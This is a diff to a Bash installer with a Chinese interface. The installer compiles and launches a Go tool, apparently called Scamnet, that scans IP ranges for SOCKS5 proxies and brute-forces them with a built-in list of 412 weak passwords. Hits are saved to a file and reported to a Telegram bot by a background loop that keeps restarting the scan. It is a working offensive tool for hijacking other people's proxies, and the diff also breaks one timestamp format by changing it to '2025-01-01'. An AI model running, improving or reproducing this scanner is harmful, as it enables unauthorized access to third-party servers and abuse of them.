@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v1.1（Go 版 + 412 条弱口令字典）
+# main.sh - Scamnet OTC v1.2（Go 版 + 412 条弱口令 + 编译通过）
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -48,8 +48,7 @@ echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-# 编译 Go 二进制（含 412 条弱口令）
-log "正在编译 Go 扫描器（含 412 条弱口令）..."
+log "正在编译 Go 扫描器（412 条弱口令）..."
 cat > scamnet.go << 'EOF'
 package main
 
@@ -60,16 +59,17 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
-	"os/signal"
 	"regexp"
 	"sort"
 	"strconv"
 	"strings"
 	"sync"
-	"syscall"
+	"sync/atomic"
 	"time"
 
 	"golang.org/x/sync/semaphore"
@@ -88,11 +88,11 @@ type Config struct {
 }
 
 var (
-	cfg        Config
-	validFile  = "socks5_valid.txt"
-	seen       = sync.Map{}
-	stats      = make(map[string]int)
-	statsMu    sync.Mutex
+	cfg          Config
+	validFile    = "socks5_ok.txt"
+	seen         = sync.Map{}
+	stats        = make(map[string]int)
+	statsMu      sync.Mutex
 	countryCache = sync.Map{}
 )
 
@@ -182,7 +182,7 @@ func main() {
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v7.1 - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v7.2 - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for i := 0; i < total; i += cfg.BatchSize {
@@ -224,10 +224,11 @@ func scanBatch(batch []string) {
 		for {
 			p := atomic.LoadInt32(&progress)
 			fmt.Printf("\r批次: %d%% | %d/%d [", p*100/total, p, total)
-			for i := int32(0); i < p*50/total; i++ {
+			bar := int(p * 50 / total)
+			for i := 0; i < bar; i++ {
 				fmt.Print("=")
 			}
-			for i := p * 50 / total; i < 50; i++ {
+			for i := bar; i < 50; i++ {
 				fmt.Print(" ")
 			}
 			fmt.Print("]")
@@ -260,8 +261,9 @@ func scanTarget(target string) {
 	}
 	seen.Store(target, true)
 
-	ip, portStr, _ := strings.Cut(target, ":")
-	port, _ := strconv.Atoi(portStr)
+	parts := strings.SplitN(target, ":", 2)
+	ip := parts[0]
+	port, _ := strconv.Atoi(parts[1])
 
 	// 无认证
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
@@ -269,7 +271,7 @@ func scanTarget(target string) {
 		return
 	}
 
-	// 弱口令爆破
+	// 弱口令
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
@@ -284,9 +286,14 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 		proxyURL = fmt.Sprintf("socks5://%s:%d", ip, port)
 	}
 
+	u, err := url.Parse(proxyURL)
+	if err != nil {
+		return false, 0, ""
+	}
+
 	client := &http.Client{
 		Transport: &http.Transport{
-			Proxy: http.ProxyURL(mustParseURL(proxyURL)),
+			Proxy: http.ProxyURL(u),
 			DialContext: (&net.Dialer{
 				Timeout: time.Duration(cfg.Timeout) * time.Second,
 			}).DialContext,
@@ -304,22 +311,15 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 	}
 	defer resp.Body.Close()
 
+	body, _ := ioutil.ReadAll(resp.Body)
 	var info IPInfo
-	if err := json.NewDecoder(resp.Body).Decode(&info); err != nil {
+	if err := json.Unmarshal(body, &info); err != nil {
 		return false, 0, ""
 	}
 	if info.Origin == "" {
 		return false, 0, ""
 	}
 	return true, lat, info.Origin
-}
-
-func mustParseURL(s string) *url.URL {
-	u, err := url.Parse(s)
-	if err != nil {
-		panic(err)
-	}
-	return u
 }
 
 func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
@@ -348,13 +348,13 @@ func getCountry(ip string) string {
 	if c, ok := countryCache.Load(ip); ok {
 		return c.(string)
 	}
-	for _, url := range []string{
+	for _, u := range []string{
 		"http://ip-api.com/json/" + ip + "?fields=countryCode",
 		"https://ipinfo.io/" + ip + "/country",
 	} {
 		client := &http.Client{Timeout: 4 * time.Second}
-		if resp, err := client.Get(url); err == nil && resp.StatusCode == 200 {
-			body, _ := io.ReadAll(resp.Body)
+		if resp, err := client.Get(u); err == nil && resp.StatusCode == 200 {
+			body, _ := ioutil.ReadAll(resp.Body)
 			code := strings.TrimSpace(string(body))
 			if len(code) == 2 && regexp.MustCompile(`^[A-Z]{2}$`).MatchString(code) {
 				countryCache.Store(ip, code)
@@ -370,9 +370,12 @@ func sendTelegram(msg string) {
 	if cfg.TelegramToken == "" || cfg.TelegramChat == "" {
 		return
 	}
-	url := "https://api.telegram.org/bot" + cfg.TelegramToken + "/sendMessage"
-	data := "chat_id=" + cfg.TelegramChat + "&text=" + url.QueryEscape(msg) + "&parse_mode=HTML"
-	http.Post(url, "application/x-www-form-urlencoded", strings.NewReader(data))
+	urlStr := "https://api.telegram.org/bot" + cfg.TelegramToken + "/sendMessage"
+	data := url.Values{}
+	data.Set("chat_id", cfg.TelegramChat)
+	data.Set("text", msg)
+	data.Set("parse_mode", "HTML")
+	http.PostForm(urlStr, data)
 }
 
 func dedupAndReport() {
@@ -394,7 +397,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v7.1 - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.2 - " + time.Now().Format("2025-01-01 15:04:05") + "\n")
 	for _, l := range sorted {
 		out.WriteString(l + "\n")
 	}
@@ -418,8 +421,7 @@ func ipToInt(ip string) uint32 {
 }
 
 func intToIP(n uint32) string {
-	return fmt.Sprintf("%d.%d.%d.%d",
-		n>>24&255, n>>16&255, n>>8&255, n&255)
+	return fmt.Sprintf("%d.%d.%d.%d", n>>24&255, n>>16&255, n>>8&255, n&255)
 }
 
 func parsePorts(s string) []int {
@@ -449,10 +451,10 @@ EOF
 go mod init scamnet >/dev/null 2>&1
 go get golang.org/x/sync/semaphore >/dev/null 2>&1
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
-succ "Go 扫描器编译完成（412 条弱口令） → $GO_BIN"
+succ "Go 扫描器编译完成 → $GO_BIN"
 
 # 守护进程
-cat > "$LOG_DIR/scamnet_guard.sh" << EOF
+cat > "$LOG_DIR/scamnet_otc.sh" << EOF
 #!/bin/bash
 while :; do
     echo "[GUARD] \$(date) - 启动扫描..."
@@ -471,11 +473,11 @@ while :; do
     sleep 3
 done
 EOF
-chmod +x "$LOG_DIR/scamnet_guard.sh"
+chmod +x "$LOG_DIR/scamnet_otc.sh"
 
-pkill -f "scamnet_guard.sh" 2>/dev/null || true
-nohup bash "$LOG_DIR/scamnet_guard.sh" > /dev/null 2>&1 &
+pkill -f "scamnet_otc.sh" 2>/dev/null || true
+nohup bash "$LOG_DIR/scamnet_otc.sh" > /dev/null 2>&1 &
 succ "守护进程启动！PID: $!"
 log "日志: tail -f $LATEST_LOG"
-log "停止: pkill -f scamnet_guard.sh"
-log "结果: socks5_valid.txt"
+log "停止: pkill -f scamnet_otc.sh"
+log "结果: socks5_ok.txt"
